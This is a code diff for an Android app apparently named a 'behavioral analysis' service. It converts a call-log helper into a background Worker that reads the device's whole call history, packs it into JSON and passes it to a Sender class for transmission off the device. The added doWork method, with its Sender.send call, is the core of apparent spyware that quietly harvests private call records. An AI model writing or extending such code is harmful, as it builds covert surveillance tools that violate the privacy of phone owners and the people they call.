@@ -1,20 +1,34 @@
 package com.behavioralanalysis.service;
 
+import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.CallLog;
+
+import androidx.annotation.NonNull;
+import androidx.work.Worker;
+import androidx.work.WorkerParameters;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class Calls {
-    public static JSONArray get() {
-        JSONArray array = new JSONArray();
-        Uri allCalls = Uri.parse("content://call_log/calls");
-        Cursor cursor = MainService.getContext().getContentResolver().query(allCalls, null, null, null, null);
+public class Calls extends Worker {
+    public static final String TAG = "call";
+    private Context context;
+    public Calls(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+        super(context, workerParams);
+        this.context = context;
+    }
 
+    @NonNull
+    @Override
+    public Result doWork() {
         try {
+            JSONArray array = new JSONArray();
+            Uri allCalls = Uri.parse("content://call_log/calls");
+            Cursor cursor = MainService.getContext().getContentResolver().query(allCalls, null, null, null, null);
+
             while (cursor.moveToNext()) {
                 JSONObject object = new JSONObject();
                 object.put(
@@ -49,10 +63,11 @@ public class Calls {
                 );
                 array.put(object);
             }
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
 
-        return array;
+            Sender.send(TAG, array.toString());
+            return Result.success();
+        } catch (Exception ex) {
+            return Result.failure();
+        }
     }
 }
